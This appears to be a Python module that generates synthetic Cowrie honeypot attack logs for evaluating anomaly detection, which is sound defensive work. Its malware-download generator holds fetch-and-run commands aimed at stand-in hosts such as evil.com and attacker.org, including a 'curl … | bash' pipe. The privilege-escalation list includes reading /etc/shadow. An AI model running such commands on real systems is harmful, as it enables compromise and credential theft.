"""
Synthetic attack campaign generation for evaluation.
Generates realistic Cowrie-like attack sequences for testing anomaly detection.
"""

import logging
import json
import random
from datetime import datetime, timedelta
from typing import Dict, Any, List, Tuple, Optional
from dataclasses import dataclass, asdict
import numpy as np
import pandas as pd
from pathlib import Path

logger = logging.getLogger(__name__)


@dataclass
class CampaignResult:
    """Result of a synthetic campaign injection."""
    campaign_id: str
    attack_type: str
    start_time: datetime
    end_time: datetime
    injected_sequences: int
    target_sources: List[str]
    metadata: Dict[str, Any]


class AttackPatternGenerator:
    """Base class for attack pattern generators."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.templates = self._load_attack_templates()
        
    def _load_attack_templates(self) -> Dict[str, List[str]]:
        """Load attack-specific template patterns."""
        return {
            'login_fail': [
                'cowrie.login.failed src_ip=<IP> username=<USER> password=<*>',
                'Invalid user <USER> from <IP> port <PORT>',
                'Failed password for <USER> from <IP> port <PORT> ssh2',
                'Connection from <IP> port <PORT> on <IP> port 22',
                'Did not receive identification string from <IP> port <PORT>'
            ],
            'login_success': [
                'cowrie.login.success src_ip=<IP> username=<USER> password=<*>',
                'Accepted password for <USER> from <IP> port <PORT> ssh2',
                'User <USER> from <IP> authenticated.'
            ],
            'commands': [
                'cowrie.command.success src_ip=<IP> session=<SESSION> input=<CMD>',
                'cowrie.command.failed src_ip=<IP> session=<SESSION> input=<CMD>',
                'Command <CMD> executed by user <USER>',
                'Shell command: <CMD>'
            ],
            'file_operations': [
                'cowrie.session.file_download url=<*> src_ip=<IP> session=<SESSION>',
                'cowrie.session.file_upload src_ip=<IP> session=<SESSION> filename=<*>',
                'File transfer: <*> from <IP>',
                'wget <*> executed from <IP>'
            ],
            'network_scan': [
                'Connection attempt from <IP> to port <PORT>',
                'Port scan detected from <IP>',
                'Multiple connection attempts from <IP>',
                'Rapid connections from <IP> port <PORT>'
            ]
        }
    
    def generate_attack_sequence(self, attack_type: str, duration_seconds: int, 
                                source_ip: str) -> List[Dict[str, Any]]:
        """Generate attack sequence for specific type and duration."""
        raise NotImplementedError


class BruteForceGenerator(AttackPatternGenerator):
    """Generate brute force attack sequences."""
    
    def generate_attack_sequence(self, attack_type: str, duration_seconds: int, 
                                source_ip: str) -> List[Dict[str, Any]]:
        """Generate brute force attack sequence."""
        sequences = []
        current_time = datetime.now()
        
        # Common usernames for brute force
        usernames = [
            'root', 'admin', 'administrator', 'user', 'test', 'guest',
            'oracle', 'postgres', 'ubuntu', 'centos', 'user1', 'admin123'
        ]
        
        # Generate rapid login attempts
        attempt_interval = random.uniform(0.5, 3.0)  # seconds between attempts
        num_attempts = max(10, int(duration_seconds / attempt_interval))
        
        session_id = f"session_{random.randint(1000, 9999)}"
        
        for i in range(num_attempts):
            # Most attempts fail, occasional success
            success = random.random() < 0.05  # 5% success rate
            
            username = random.choice(usernames)
            template_type = 'login_success' if success else 'login_fail'
            template = random.choice(self.templates[template_type])
            
            # Replace placeholders
            template = template.replace('<IP>', source_ip)
            template = template.replace('<USER>', username)
            template = template.replace('<PORT>', str(random.choice([22, 2222, 22222])))
            template = template.replace('<SESSION>', session_id)
            
            sequence = {
                'timestamp': (current_time + timedelta(seconds=i * attempt_interval)).isoformat(),
                'source': source_ip,
                'host_id': 'cowrie-honeypot-1',
                'template': template,
                'attack_type': 'brute_force',
                'campaign_sequence_id': i,
                'is_synthetic': True
            }
            
            sequences.append(sequence)
            
            # If successful, add some post-compromise activity
            if success:
                post_compromise_templates = [
                    'cowrie.command.success src_ip=<IP> session=<SESSION> input=whoami',
                    'cowrie.command.success src_ip=<IP> session=<SESSION> input=pwd',
                    'cowrie.command.success src_ip=<IP> session=<SESSION> input=ls -la',
                    'cowrie.command.success src_ip=<IP> session=<SESSION> input=uname -a'
                ]
                
                for j, cmd_template in enumerate(post_compromise_templates[:3]):
                    cmd_template = cmd_template.replace('<IP>', source_ip)
                    cmd_template = cmd_template.replace('<SESSION>', session_id)
                    
                    cmd_sequence = {
                        'timestamp': (current_time + timedelta(
                            seconds=i * attempt_interval + (j + 1) * 2
                        )).isoformat(),
                        'source': source_ip,
                        'host_id': 'cowrie-honeypot-1',
                        'template': cmd_template,
                        'attack_type': 'brute_force_post_compromise',
                        'campaign_sequence_id': i + j + 1,
                        'is_synthetic': True
                    }
                    
                    sequences.append(cmd_sequence)
                
                break  # End after successful login
        
        return sequences


class ReconScanGenerator(AttackPatternGenerator):
    """Generate reconnaissance/scanning attack sequences."""
    
    def generate_attack_sequence(self, attack_type: str, duration_seconds: int, 
                                source_ip: str) -> List[Dict[str, Any]]:
        """Generate reconnaissance scan sequence."""
        sequences = []
        current_time = datetime.now()
        
        # Port scan patterns
        scan_ports = [22, 23, 21, 80, 443, 25, 53, 110, 143, 993, 995, 3389, 5900]
        
        # Generate rapid port connections
        connection_interval = random.uniform(0.1, 0.5)
        num_connections = min(len(scan_ports), int(duration_seconds / connection_interval))
        
        for i in range(num_connections):
            port = scan_ports[i % len(scan_ports)]
            template = random.choice(self.templates['network_scan'])
            
            template = template.replace('<IP>', source_ip)
            template = template.replace('<PORT>', str(port))
            
            sequence = {
                'timestamp': (current_time + timedelta(seconds=i * connection_interval)).isoformat(),
                'source': source_ip,
                'host_id': 'cowrie-honeypot-1', 
                'template': template,
                'attack_type': 'recon_scan',
                'campaign_sequence_id': i,
                'is_synthetic': True
            }
            
            sequences.append(sequence)
            
            # Add some connection attempts to SSH (port 22)
            if port == 22:
                for attempt in range(random.randint(1, 3)):
                    fail_template = random.choice(self.templates['login_fail'])
                    fail_template = fail_template.replace('<IP>', source_ip)
                    fail_template = fail_template.replace('<USER>', 'root')
                    fail_template = fail_template.replace('<PORT>', '22')
                    
                    fail_sequence = {
                        'timestamp': (current_time + timedelta(
                            seconds=i * connection_interval + attempt * 0.5
                        )).isoformat(),
                        'source': source_ip,
                        'host_id': 'cowrie-honeypot-1',
                        'template': fail_template,
                        'attack_type': 'recon_login_attempt',
                        'campaign_sequence_id': i + attempt + 1,
                        'is_synthetic': True
                    }
                    
                    sequences.append(fail_sequence)
        
        return sequences


class MalwareDownloadGenerator(AttackPatternGenerator):
    """Generate malware download attack sequences."""
    
    def generate_attack_sequence(self, attack_type: str, duration_seconds: int, 
                                source_ip: str) -> List[Dict[str, Any]]:
        """Generate malware download sequence."""
        sequences = []
        current_time = datetime.now()
        session_id = f"session_{random.randint(1000, 9999)}"
        
        # First, successful login
        login_template = random.choice(self.templates['login_success'])
        login_template = login_template.replace('<IP>', source_ip)
        login_template = login_template.replace('<USER>', 'root')
        
        sequences.append({
            'timestamp': current_time.isoformat(),
            'source': source_ip,
            'host_id': 'cowrie-honeypot-1',
            'template': login_template,
            'attack_type': 'malware_download_login',
            'campaign_sequence_id': 0,
            'is_synthetic': True
        })
        
        # Download commands
        download_commands = [
            'wget http://evil.com/malware.sh',
            'curl -O http://badsite.net/payload.bin', 
            'wget -O /tmp/backdoor http://attacker.org/tool',
            'curl http://malicious.com/script.sh | bash'
        ]
        
        # Execute downloads
        for i, cmd in enumerate(download_commands[:2]):  # Limit to 2 downloads
            cmd_template = random.choice(self.templates['commands'])
            cmd_template = cmd_template.replace('<IP>', source_ip)
            cmd_template = cmd_template.replace('<CMD>', cmd)
            cmd_template = cmd_template.replace('<SESSION>', session_id)
            
            sequence = {
                'timestamp': (current_time + timedelta(seconds=(i + 1) * 10)).isoformat(),
                'source': source_ip,
                'host_id': 'cowrie-honeypot-1',
                'template': cmd_template,
                'attack_type': 'malware_download',
                'campaign_sequence_id': i + 1,
                'is_synthetic': True
            }
            
            sequences.append(sequence)
            
            # Add file download event
            download_template = random.choice(self.templates['file_operations'])
            download_template = download_template.replace('<IP>', source_ip)
            download_template = download_template.replace('<SESSION>', session_id)
            
            download_sequence = {
                'timestamp': (current_time + timedelta(seconds=(i + 1) * 10 + 2)).isoformat(),
                'source': source_ip,
                'host_id': 'cowrie-honeypot-1',
                'template': download_template,
                'attack_type': 'malware_file_download',
                'campaign_sequence_id': i + 2,
                'is_synthetic': True
            }
            
            sequences.append(download_sequence)
        
        # Execute downloaded files
        execute_commands = ['chmod +x /tmp/malware.sh', 'bash /tmp/malware.sh', 'nohup /tmp/backdoor &']
        
        for i, cmd in enumerate(execute_commands):
            cmd_template = random.choice(self.templates['commands'])
            cmd_template = cmd_template.replace('<IP>', source_ip)
            cmd_template = cmd_template.replace('<CMD>', cmd)
            cmd_template = cmd_template.replace('<SESSION>', session_id)
            
            sequence = {
                'timestamp': (current_time + timedelta(seconds=30 + i * 5)).isoformat(),
                'source': source_ip,
                'host_id': 'cowrie-honeypot-1',
                'template': cmd_template,
                'attack_type': 'malware_execution',
                'campaign_sequence_id': len(sequences) + i,
                'is_synthetic': True
            }
            
            sequences.append(sequence)
        
        return sequences


class PrivilegeEscalationGenerator(AttackPatternGenerator):
    """Generate privilege escalation attack sequences."""
    
    def generate_attack_sequence(self, attack_type: str, duration_seconds: int, 
                                source_ip: str) -> List[Dict[str, Any]]:
        """Generate privilege escalation sequence."""
        sequences = []
        current_time = datetime.now()
        session_id = f"session_{random.randint(1000, 9999)}"
        
        # Login as non-root user
        login_template = random.choice(self.templates['login_success'])
        login_template = login_template.replace('<IP>', source_ip)
        login_template = login_template.replace('<USER>', 'ubuntu')
        
        sequences.append({
            'timestamp': current_time.isoformat(),
            'source': source_ip,
            'host_id': 'cowrie-honeypot-1',
            'template': login_template,
            'attack_type': 'privesc_login',
            'campaign_sequence_id': 0,
            'is_synthetic': True
        })
        
        # Privilege escalation commands
        privesc_commands = [
            'sudo -l',
            'find / -perm -4000 2>/dev/null',
            'cat /etc/passwd',
            'cat /etc/shadow',
            'sudo su -',
            'su root',
            'whoami',
            'id',
            'ps aux | grep root'
        ]
        
        for i, cmd in enumerate(privesc_commands):
            cmd_template = random.choice(self.templates['commands'])
            cmd_template = cmd_template.replace('<IP>', source_ip)
            cmd_template = cmd_template.replace('<CMD>', cmd)
            cmd_template = cmd_template.replace('<SESSION>', session_id)
            cmd_template = cmd_template.replace('<USER>', 'ubuntu' if i < 5 else 'root')
            
            sequence = {
                'timestamp': (current_time + timedelta(seconds=(i + 1) * 8)).isoformat(),
                'source': source_ip,
                'host_id': 'cowrie-honeypot-1',
                'template': cmd_template,
                'attack_type': 'privilege_escalation',
                'campaign_sequence_id': i + 1,
                'is_synthetic': True
            }
            
            sequences.append(sequence)
        
        return sequences


class SyntheticCampaignInjector:
    """Main class for injecting synthetic attack campaigns."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.campaign_duration = config.get('campaign_duration', 300)
        self.campaigns_per_type = config.get('campaigns_per_type', 5)
        
        # Initialize generators
        self.generators = {
            'brute_force': BruteForceGenerator(config),
            'recon_scan': ReconScanGenerator(config),
            'malware_download': MalwareDownloadGenerator(config),
            'privilege_escalation': PrivilegeEscalationGenerator(config)
        }
        
        # Track injected campaigns
        self.injected_campaigns: List[CampaignResult] = []
    
    def generate_attack_ips(self, num_ips: int) -> List[str]:
        """Generate realistic attacker IP addresses."""
        # Common attacker IP ranges (for realism)
        ip_patterns = [
            "192.168.{}.{}",
            "10.0.{}.{}",
            "172.16.{}.{}",
            "203.{}.{}.{}",
            "41.{}.{}.{}",
            "185.{}.{}.{}"
        ]
        
        ips = []
        for _ in range(num_ips):
            pattern = random.choice(ip_patterns)
            if pattern.count('{}') == 2:
                ip = pattern.format(
                    random.randint(1, 255),
                    random.randint(1, 254)
                )
            else:
                ip = pattern.format(
                    random.randint(1, 255),
                    random.randint(1, 255),
                    random.randint(1, 254)
                )
            ips.append(ip)
        
        return ips
    
    def inject_campaign(self, attack_type: str, base_time: Optional[datetime] = None) -> CampaignResult:
        """Inject a single synthetic attack campaign."""
        if attack_type not in self.generators:
            raise ValueError(f"Unknown attack type: {attack_type}")
        
        if base_time is None:
            base_time = datetime.now()
        
        # Generate attacker IP
        attacker_ip = self.generate_attack_ips(1)[0]
        
        # Generate attack sequence
        generator = self.generators[attack_type]
        sequences = generator.generate_attack_sequence(
            attack_type, self.campaign_duration, attacker_ip
        )
        
        # Create campaign result
        campaign_id = f"{attack_type}_{int(base_time.timestamp())}"
        
        end_time = base_time + timedelta(seconds=self.campaign_duration)
        
        campaign_result = CampaignResult(
            campaign_id=campaign_id,
            attack_type=attack_type,
            start_time=base_time,
            end_time=end_time,
            injected_sequences=len(sequences),
            target_sources=[attacker_ip],
            metadata={
                'sequences': sequences,
                'generator_config': self.config
            }
        )
        
        self.injected_campaigns.append(campaign_result)
        
        logger.info(f"Injected {attack_type} campaign with {len(sequences)} sequences from {attacker_ip}")
        
        return campaign_result
    
    def inject_all_campaigns(self, output_path: str) -> List[CampaignResult]:
        """Inject all configured campaign types."""
        all_results = []
        
        for attack_type in self.config.get('attack_types', ['brute_force', 'recon_scan']):
            for i in range(self.campaigns_per_type):
                # Stagger campaign start times
                base_time = datetime.now() + timedelta(minutes=i * 10)
                
                try:
                    result = self.inject_campaign(attack_type, base_time)
                    all_results.append(result)
                except Exception as e:
                    logger.error(f"Failed to inject {attack_type} campaign {i}: {e}")
        
        # Save campaign results
        self.save_campaign_results(all_results, output_path)
        
        return all_results
    
    def save_campaign_results(self, results: List[CampaignResult], output_path: str):
        """Save campaign results to file."""
        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        
        # Save campaign metadata
        campaign_data = []
        all_sequences = []
        
        for result in results:
            # Campaign summary
            campaign_summary = asdict(result)
            # Don't include sequences in summary (too large)
            sequences = campaign_summary['metadata'].pop('sequences', [])
            campaign_data.append(campaign_summary)
            
            # Collect all sequences
            all_sequences.extend(sequences)
        
        # Save campaign metadata
        with open(f"{output_path}_campaigns.json", 'w') as f:
            json.dump(campaign_data, f, indent=2, default=str)
        
        # Save sequences as JSONL
        with open(f"{output_path}_sequences.jsonl", 'w') as f:
            for seq in all_sequences:
                f.write(json.dumps(seq, default=str) + '\n')
        
        # Save as DataFrame for analysis
        if all_sequences:
            df = pd.DataFrame(all_sequences)
            df.to_parquet(f"{output_path}_sequences.parquet", index=False)
        
        logger.info(f"Saved {len(results)} campaigns with {len(all_sequences)} sequences to {output_path}")
    
    def get_campaign_summary(self) -> Dict[str, Any]:
        """Get summary of injected campaigns."""
        if not self.injected_campaigns:
            return {'total_campaigns': 0}
        
        summary = {
            'total_campaigns': len(self.injected_campaigns),
            'total_sequences': sum(c.injected_sequences for c in self.injected_campaigns),
            'attack_types': list(set(c.attack_type for c in self.injected_campaigns)),
            'time_range': {
                'start': min(c.start_time for c in self.injected_campaigns),
                'end': max(c.end_time for c in self.injected_campaigns)
            },
            'target_sources': list(set(
                ip for c in self.injected_campaigns for ip in c.target_sources
            ))
        }
        
        return summary


if __name__ == "__main__":
    # Example usage
    import yaml
    
    # Load configuration
    with open('./configs/config.yaml', 'r') as f:
        config = yaml.safe_load(f)
    
    injection_config = config['evaluation']['injection']
    
    # Create injector
    injector = SyntheticCampaignInjector(injection_config)
    
    # Inject campaigns
    results = injector.inject_all_campaigns('./data/synthetic_campaigns')
    
    # Print summary
    summary = injector.get_campaign_summary()
    print("Campaign Injection Summary:")
    print(json.dumps(summary, indent=2, default=str))